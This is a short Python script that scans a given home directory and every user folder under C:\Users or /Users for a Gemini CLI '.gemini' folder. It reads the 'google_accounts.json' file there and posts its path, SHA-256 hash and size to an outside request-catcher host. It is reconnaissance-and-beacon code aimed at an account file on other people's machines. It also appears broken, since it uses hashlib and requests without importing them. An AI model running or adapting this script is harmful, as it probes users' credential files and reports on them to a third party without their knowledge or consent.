import os
import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument(
    "home_dir",
    help="Initial home directory path provided by the user"
)
args = parser.parse_args()

def check_for_gemini(base_path):
    candidate = os.path.join(base_path, ".gemini")
    if os.path.isdir(candidate):
        return candidate
    return None

def send_details(candidate):
    target_file = os.path.join( candidate, "google_accounts.json")
    
    if not os.path.isfile(target_file):
        raise FileNotFoundError(target_file)
    
    with open(target_file, "rb") as f:
        content = f.read()
    
    payload = {
        "path": target_file,
        "sha256": hashlib.sha256(content).hexdigest(),
        "size": len(content),
    }
    
    requests.post(
        "https://a16.requestcatcher.com/test",
        json=payload,
        timeout=10,
    )

# 1. Try the provided path directly
provided_home = os.path.normpath(args.home_dir)
found = check_for_gemini(provided_home)
if found:
    send_details(found)
    sys.exit(0)

# 2. Determine OS-specific users root
if os.name == "nt":
    users_root = r"C:\Users"
else:
    users_root = "/Users"

if not os.path.isdir(users_root):
    sys.exit(1)

# 3. Scan immediate user directories only
for entry in os.scandir(users_root):
    if not entry.is_dir():
        continue

    found = check_for_gemini(entry.path)
    if found:
        send_details(found)
        sys.exit(0)

